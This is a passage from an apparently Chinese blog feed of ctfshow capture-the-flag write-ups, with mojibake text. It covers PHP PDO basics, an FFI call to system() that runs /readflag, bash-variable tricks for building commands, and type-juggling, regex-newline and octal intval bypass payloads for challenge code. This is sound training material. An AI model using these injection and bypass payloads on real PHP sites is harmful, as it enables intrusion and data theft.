class="comment">//ç”ŸæˆPDOå¯¹è±¡</span></span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> PDO(<span class="variable">$dsn</span>,<span class="variable">$user</span>,<span class="variable">$password</span>);</span><br><span class="line"><span class="comment">//æ‰§è¡Œæ·»åŠ </span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;insert into student(`name`,`sex`,`sex`) values(&#x27;zhangsan&#x27;,&#x27;ç”·&#x27;,&#x27;18&#x27;)&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$object</span>-&gt;exec(<span class="variable">$sql</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;æ·»åŠ æˆåŠŸ&#x27;</span>;</span><br><span class="line">&#125;<span class="comment">//execä¸»è¦ç”¨äºæ‰§è¡Œæ²¡æœ‰è¿”å›ç»“æœé›†çš„æ“ä½œï¼Œæ¯”å¦‚insertã€deleteã€updateï¼Œè¿”å›çš„æ˜¯å½±å“çš„è®°å½•æ¡æ•°</span></span><br></pre></td></tr></table></figure><p>2ã€æŸ¥è¯¢<br> ä¸»è¦æ€è·¯ï¼š<br>                                         ï¼ˆ1ï¼‰è¿æ¥æ•°æ®åº“ã€æ•°æ®åº“çš„ç”¨æˆ·åã€æ•°æ®åº“çš„å¯†ç <br>                                         ï¼ˆ2ï¼‰ç”ŸæˆPDOå¯¹è±¡<br>                                         ï¼ˆ3ï¼‰æ‰§è¡ŒæŸ¥è¯¢ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf8&#x27;</span>);</span><br><span class="line"><span class="comment">//è¿æ¥æ•°æ®åº“</span></span><br><span class="line"><span class="variable">$dsn</span>=<span class="string">&quot;mysql:dbname=test;host=127.0.0.1&quot;</span>;</span><br><span class="line"><span class="comment">//æ•°æ®åº“çš„ç”¨æˆ·å</span></span><br><span class="line"><span class="variable">$user</span>=<span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="comment">//æ•°æ®åº“çš„å¯†ç </span></span><br><span class="line"><span class="variable">$password</span>=<span class="string">&quot;123456&quot;</span>;</span><br><span class="line"><span class="comment">//ç”ŸæˆPDOå¯¹è±¡</span></span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> PDO(<span class="variable">$dsn</span>,<span class="variable">$user</span>,<span class="variable">$password</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from student&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$object</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$arr</span>=<span class="variable">$result</span>-&gt;fetch())&#123;</span><br><span class="line">    print_r(<span class="variable">$arr</span>);</span><br><span class="line">&#125;<span class="comment">//ç”¨å¾ªç¯åˆ©ç”¨fetch()æ–¹æ³•é€ä¸ªçš„å–å‡ºè®°å½•ï¼Œè¿”å›çš„æ˜¯å…³è”æ•°ç»„å’Œç´¢å¼•æ•°ç»„ä¸¤ç§æ•°ç»„ï¼Œå’Œmysql_fetch_array()çš„è¿”å›ç»“æœä¸€è‡´</span></span><br></pre></td></tr></table></figure><p>è¿˜å¯ä»¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span>=<span class="variable">$result</span>-&gt;fetchAll();<span class="comment">//fetchAll()æ–¹æ³•å¯ä»¥ä¸€æ¬¡å–å‡ºç»“æœé›†ä¸­æ‰€æœ‰çš„æ•°ç»„ï¼Œä»¥äºŒç»´æ•°ç»„çš„å½¢å¼è¿”å›ï¼Œä½†ä»ç„¶æ˜¯å…³è”æ•°ç»„å’Œç´¢å¼•æ•°ç»„ä¸¤ç§æ•°ç»„</span></span><br><span class="line">print_r(<span class="variable">$student_info</span>);</span><br></pre></td></tr></table></figure><h2 id="web-77"><a href="#web-77" class="headerlink" title="web 77"></a>web 77</h2><p>é€šè¿‡è¯¥é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å¼€å§‹çš„æç¤ºä¸­çœ‹åˆ°PHP7.4ï¼Œä»è€Œå¯ä»¥æƒ³åˆ°FFIï¼ˆè™½ç„¶æˆ‘ä¹Ÿä¸çŸ¥é“å¦‚ä½•æƒ³åˆ°çš„ï¼Œä½†æˆ‘ä»¬åº”è¯¥çŸ¥é“FFIä¸ºPHP7.4æ ¸å¿ƒæ‹“å±•ã€‚</p><blockquote><p>FFIï¼ˆForeign Function Interfaceï¼‰ï¼Œå³å¤–éƒ¨å‡½æ•°æ¥å£ï¼Œæ˜¯æŒ‡åœ¨ä¸€ç§è¯­è¨€é‡Œè°ƒç”¨å¦ä¸€ç§è¯­è¨€ä»£ç çš„æŠ€æœ¯ã€‚PHPçš„FFIæ‰©å±•å°±æ˜¯ä¸€ä¸ªè®©ä½ åœ¨PHPé‡Œè°ƒç”¨Cä»£ç çš„æŠ€æœ¯ã€‚</p></blockquote><p>é€šè¿‡FFIï¼Œå¯ä»¥å®ç°è°ƒç”¨systemå‡½æ•°ï¼Œä»è€Œå°†flagç›´æ¥å†™å…¥ä¸€ä¸ªæ–°å»ºçš„æ–‡æœ¬æ–‡ä»¶ä¸­ï¼Œç„¶åè®¿é—®è¿™ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œè·å¾—flagã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//é¦–å…ˆæ˜¯ç†Ÿæ‚‰çš„ç¡®å®šflagä½ç½®å’Œåç§°</span></span><br><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>) </span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27;  &#x27;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//FFIè°ƒç”¨systemå‡½æ•°</span></span><br><span class="line">c=</span><br><span class="line"><span class="variable">$ffi</span>=FFI :: cdef(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$ffi</span>-&gt;system(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="WEB118"><a href="#WEB118" class="headerlink" title="WEB118"></a>WEB118</h2><p>æ‹¿åˆ°é¢˜ä¸€è„¸æ‡µï¼Œä¸çŸ¥é“è¯¥å¹²å•¥ï¼Œçœ‹æºç çŸ¥é“?codeï¼Œçœ‹å¤§ä½¬wpå‘ç°å¥½ä¸œè¥¿</p><blockquote><p>root@baba:<del># echo ${PWD}<br>/root<br>root@baba:</del># echo ${PWD:1:1}   //è¡¨ç¤ºä»ç¬¬2ï¼ˆ1+1ï¼‰ä¸ªå­—ç¬¦å¼€å§‹çš„ä¸€ä¸ªå­—ç¬¦<br>r<br>root@baba:<del># echo ${PWD:0:1}   //è¡¨ç¤ºä»ç¬¬1ï¼ˆ0+1ï¼‰ä¸ªå­—ç¬¦å¼€å§‹çš„ä¸€ä¸ªå­—ç¬¦<br>/<br>root@baba:</del># echo ${PWD:<del>0:1}  //è¡¨ç¤ºä»æœ€åä¸€ä¸ªå­—ç¬¦å¼€å§‹çš„ä¸€ä¸ªå­—ç¬¦<br>t<br>root@baba:</del># echo ${PWD:~A}    //å­—æ¯ä»£è¡¨0<br>t</p></blockquote><p>åˆ©ç”¨å„ç§ç¯å¢ƒå˜é‡æ¥æ„é€ å‘½ä»¤<br>é¦–å…ˆéœ€è¦çŸ¥é“${PWD}ï¼šçœ‹å½“å‰è·¯å¾„<br>${PATH}é€šå¸¸ä¸ºbin<br>é€šè¿‡ä¸Šé¢çš„è§„åˆ™æ¥æ„é€ å‘½ä»¤ï¼ˆè‹¥çœ‹ä¸æ‡‚å¯ä»¥çœ‹Linux åŸºç¡€çŸ¥è¯†ï¼šBashçš„å†…ç½®å˜é‡<br>å¸¸è§ Bash å†…ç½®å˜é‡ä»‹ç»ï¼‰<br>ç”±äºé€šé…ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œåˆ™æ„é€ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ????.???</span><br><span class="line"><span class="comment">//åœ¨çœ‹æºç å°±å¯ä»¥çœ‹åˆ°flag</span></span><br></pre></td></tr></table></figure><h2 id="web119-120"><a href="#web119-120" class="headerlink" title="web119~120"></a>web119~120</h2><p>æ¯”ä¸Šé¢˜å¤šè¿‡æ»¤äº†pathã€‚</p><blockquote><p>SHLVLï¼šæ˜¯è®°å½•å¤šä¸ª Bash è¿›ç¨‹å®ä¾‹åµŒå¥—æ·±åº¦çš„ç´¯åŠ å™¨,è¿›ç¨‹ç¬¬ä¸€æ¬¡æ‰“å¼€shellæ—¶${SHLVL}=1ï¼Œç„¶ååœ¨æ­¤shellä¸­å†æ‰“å¼€ä¸€ä¸ªshellæ—¶$SHLVL=2ã€‚<br>RANDOMï¼šæ­¤å˜é‡å€¼ï¼Œéšæœºå‡ºç°æ•´æ•°ï¼ŒèŒƒå›´ä¸º0-32767ã€‚ä¸è¿‡ï¼Œè™½ç„¶è¯´æ˜¯éšæœºï¼Œä½†å¹¶ä¸æ˜¯çœŸæ­£çš„éšæœºï¼Œå› ä¸ºæ¯æ¬¡å¾—åˆ°çš„éšæœºæ•°éƒ½ä¸€æ ·ã€‚ä¸ºæ­¤ï¼Œåœ¨ä½¿ç”¨RANDOMå˜é‡å‰ï¼Œè¯·éšæ„è®¾å®šä¸€ä¸ªæ•°å­—ç»™RANDOMï¼Œå½“åšéšæœºæ•°ç§å­ï¼Œè¿™æ ·æ‰ä¸ä¼šæ¯æ¬¡äº§ç”Ÿçš„éšæœºæ•°å…¶é¡ºåºéƒ½ä¸€æ ·ã€‚<br>åœ¨Linuxä¸­ï¼Œ$æˆ–$</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow webå…¥é—¨ phpç‰¹æ€§</title>
      <link href="/2022/01/07/ctfshow%20web%E5%85%A5%E9%97%A8%20php%E7%89%B9%E6%80%A7/"/>
      <url>/2022/01/07/ctfshow%20web%E5%85%A5%E9%97%A8%20php%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<p>ä¸€äº›å‡½æ•°ç»•è¿‡<br><a href="https://lazzzaro.github.io/2020/05/18/web-PHP%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/index.html">PHPç»•è¿‡å§¿åŠ¿</a></p><h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><p>é€šè¿‡æ•°ç»„ç»•è¿‡<br>payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h2><p>ç”¨å°æ•°è¿›è¡Œç»•è¿‡<br>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=<span class="number">4476.1</span></span><br></pre></td></tr></table></figure><h2 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€ƒå¯Ÿç‚¹ï¼šæ­£åˆ™è¡¨è¾¾å¼ä¿®é¥°ç¬¦<br>æ‹“å±•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">i </span><br><span class="line">ä¸åŒºåˆ†(ignore)å¤§å°å†™</span><br><span class="line"></span><br><span class="line">m</span><br><span class="line">å¤š(more)è¡ŒåŒ¹é…</span><br><span class="line">è‹¥å­˜åœ¨æ¢è¡Œ\nå¹¶ä¸”æœ‰å¼€å§‹^æˆ–ç»“æŸ$ç¬¦çš„æƒ…å†µä¸‹ï¼Œ</span><br><span class="line">å°†ä»¥æ¢è¡Œä¸ºåˆ†éš”ç¬¦ï¼Œé€è¡Œè¿›è¡ŒåŒ¹é…</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;abc\nabc&quot;</span>;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&quot;/^abc$/m&quot;</span>;</span><br><span class="line">preg_match(<span class="variable">$preg</span>, <span class="variable">$str</span>,<span class="variable">$matchs</span>);</span><br><span class="line">è¿™æ ·å…¶å®æ˜¯ç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼çš„ï¼Œå› ä¸ºåŒ¹é…çš„æ—¶å€™ å…ˆæ˜¯åŒ¹é…æ¢è¡Œç¬¦å‰é¢çš„ï¼Œæ¥ç€åŒ¹é…æ¢è¡Œç¬¦åé¢çš„ï¼Œä¸¤ä¸ªéƒ½æ˜¯abcæ‰€ä»¥å¯ä»¥é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼ã€‚</span><br><span class="line"></span><br><span class="line">s</span><br><span class="line">ç‰¹æ®Šå­—ç¬¦åœ†ç‚¹ . ä¸­åŒ…å«æ¢è¡Œç¬¦</span><br><span class="line">é»˜è®¤çš„åœ†ç‚¹ . æ˜¯åŒ¹é…é™¤æ¢è¡Œç¬¦ \n ä¹‹å¤–çš„ä»»ä½•å•å­—ç¬¦ï¼ŒåŠ ä¸Šsä¹‹å, .åŒ…å«æ¢è¡Œç¬¦</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;abggab\nacbs&quot;</span>;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&quot;/b./s&quot;</span>;</span><br><span class="line">preg_match_all(<span class="variable">$preg</span>, <span class="variable">$str</span>,<span class="variable">$matchs</span>);</span><br><span class="line">è¿™æ ·åŒ¹é…åˆ°çš„æœ‰ä¸‰ä¸ª bg b\n bs</span><br><span class="line"></span><br><span class="line">A</span><br><span class="line">å¼ºåˆ¶ä»ç›®æ ‡å­—ç¬¦ä¸²å¼€å¤´åŒ¹é…;</span><br><span class="line"></span><br><span class="line">D</span><br><span class="line">å¦‚æœä½¿ç”¨$é™åˆ¶ç»“å°¾å­—ç¬¦,åˆ™ä¸å…è®¸ç»“å°¾æœ‰æ¢è¡Œ; </span><br><span class="line"></span><br><span class="line">e</span><br><span class="line">é…åˆå‡½æ•°preg_replace()ä½¿ç”¨, å¯ä»¥æŠŠåŒ¹é…æ¥çš„å­—ç¬¦ä¸²å½“ä½œæ­£åˆ™è¡¨è¾¾å¼æ‰§è¡Œ; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æœ¬é¢˜ä¸­ç”±äº/må¯ä»¥åŒ¹é…åˆ°æ¢è¡Œç¬¦ä¹‹åçš„ä¸œè¥¿ï¼Œå› æ­¤æ„é€ è·¯å¾„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%<span class="number">0</span>aphp</span><br></pre></td></tr></table></figure><p>%0aphp ç»è¿‡ç¬¬ä¸€ä¸ªåŒ¹é…æ—¶ï¼Œä»¥æ¢è¡Œç¬¦ä¸ºåˆ†å‰²ä¹Ÿå°±æ˜¯%0aï¼Œå‰é¢å› ä¸ºæ˜¯ç©ºçš„ï¼Œæ‰€ä»¥åªåŒ¹é…æ¢è¡Œç¬¦åé¢çš„ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ã€‚<br>ç»è¿‡ç¬¬äºŒä¸ªæ­£åˆ™è¡¨è¾¾å¼æ—¶ï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯%0aphp ä¸ç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼çš„ä»¥phpå¼€å¤´ä»¥phpç»“å°¾ã€‚æ‰€ä»¥æ— æ³•é€šè¿‡ï¼Œæœ€åè¾“å‡ºflag</p><h2 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 16:29:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡æºç å¯ä»¥çœ‹å‡ºæˆ‘ä»¬è¦è®©num==4476ï¼Œä½†åŒæ—¶ä¹Ÿè¦è®©intval(num)ä¹Ÿä¸ºé›¶ã€‚<br>intval()æ˜¯å°†æ•°æ®è½¬åŒ–ä¸ºæ•´å½¢ï¼Œå› æ­¤å¯ä»¥é€šè¿‡å°æ•°æ¥ç»•è¿‡ã€‚<br>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=<span class="number">4476.1</span></span><br></pre></td></tr></table></figure><h2 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h2><p>åŒä¸Šæ–¹æ³•ä¸€æ ·</p><h2 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>)</span><br></pre></td></tr></table></figure><p>strpos() å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®<br>(è¯¥å‡½æ•°ä¸­0ä¸èƒ½å‡ºç°åœ¨ç¬¬ä¸€ä¸ªä½ç½®ä¸Š)<br>ç»•è¿‡payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=<span class="number">4476.0</span></span><br></pre></td></tr></table></figure><h2 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h2><p>ç§‘æ™®ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>ã€å…«è¿›åˆ¶æ•°æ˜¯ä¸€ç§é€¢å…«è¿›ä¸€çš„è®¡æ•°ä½“åˆ¶ï¼ŒåŸºæ•°æ˜¯<span class="number">8</span>ï¼Œç”¨<span class="number">0</span>~<span class="number">7</span>è¡¨ç¤ºï¼Œå¦‚<span class="number">077</span>ã€‚</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>ã€å…«è¿›åˆ¶æ•°ä»¥æ•°å­—<span class="number">0</span>å¼€å¤´ã€‚</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>ã€åå…­è¿›åˆ¶æ•°æ˜¯ä¸€ç§é€¢åå…­è¿›ä¸€çš„è®¡æ•°ä½“åˆ¶ï¼ŒåŸºæ•°æ˜¯<span class="number">16</span>ï¼Œç”¨<span class="number">0</span>~<span class="number">9</span>,A~Fè¡¨ç¤ºï¼Œå¦‚<span class="number">0xFF</span>æˆ–<span class="number">0XFF</span>ã€‚</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>ã€åå…­è¿›åˆ¶æ•°ä»¥æ•°å­—<span class="number">0</span>å’Œå­—æ¯xçš„ç»„åˆ<span class="number">0</span>xæˆ–<span class="number">0</span>Xå¼€å¤´ã€‚å…¶ä¸­å­—æ¯xæ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œå³<span class="number">0</span>xä¸<span class="number">0</span>Xç­‰ä»·ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ¬é¢˜å°†å°æ•°ç‚¹è¿‡æ»¤ï¼Œä½¿å¾—æ— æ³•ç”¨å°æ•°ï¼Œç”±äºä¸èƒ½ç”¨å­—æ¯ï¼Œåˆ™ç§‘å­¦è®¡æ•°æ³•å’Œåå…­è¿›åˆ¶éƒ½æ— æ³•ä½¿ç”¨ï¼Œå› æ­¤åªèƒ½è€ƒè™‘å…«è¿›åˆ¶ã€‚<br>payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=+<span class="number">010574</span></span><br></pre></td></tr></table></figure><h2 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 19:21:24</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span 